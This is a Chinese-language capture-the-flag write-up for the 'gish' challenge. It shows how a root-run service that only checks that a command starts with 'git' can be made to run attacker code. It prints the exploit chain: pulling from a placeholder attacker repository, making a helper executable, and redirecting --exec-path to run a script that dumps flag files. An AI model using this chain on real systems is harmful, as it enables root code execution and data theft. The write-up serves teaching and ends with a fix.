# gish

## 题目简述

服务逐行读取命令，用 `shlex.split` 拆分后只检查 `args[0] == "git"`，再以参数数组调用 Git。该 Python 服务又由 `sudo` 启动，因此 Git 及其外部 helper 都以 root 权限运行。攻击目标是在“只能执行 git 命令”的限制下，让 Git 调用攻击者提供的可执行 helper。

## 解题过程

先在公网可访问的位置托管一个 Git 仓库。仓库包含：

- `.git_cache_meta`：让题目内置的 `git-cache-meta --apply` 把 `execs/git-mergetools` 设为可执行；
- `execs/git-mergetools`：搜索 `/flag-*.txt` 并输出内容；
- 其他普通仓库元数据。

服务端按以下顺序执行：

```bash
git init
git remote add origin https://ATTACKER/repo.git
git pull origin main
git cache-meta --apply
git --exec-path=/srv/execs mergetools
end
```

最后一条命令仍以 `git` 开头，但 `--exec-path=/srv/execs` 改写了 Git 查找子命令的位置。`git mergetools` 因而实际执行 `/srv/execs/git-mergetools`：

```bash
#!/bin/sh
cat $(find / -name 'flag-*.txt')
```

输出为：

```text
tjctf{uncontrolled_versions_1831821a}
```

## 方法总结

- 只校验命令的第一个单词不足以构成安全命令白名单；Git 本身能通过 helper、alias、hook、配置和 `--exec-path` 扩展执行。
- 题目利用链是“拉取攻击者仓库 → 恢复可执行权限 → 改写 helper 搜索路径 → root helper 执行”，每一步都由允许的 Git 命令完成。
- 修复应去掉不必要的 `sudo`，并以固定参数调用单一受控操作；把功能丰富的 Git 整体暴露给不可信输入无法形成可靠沙箱。
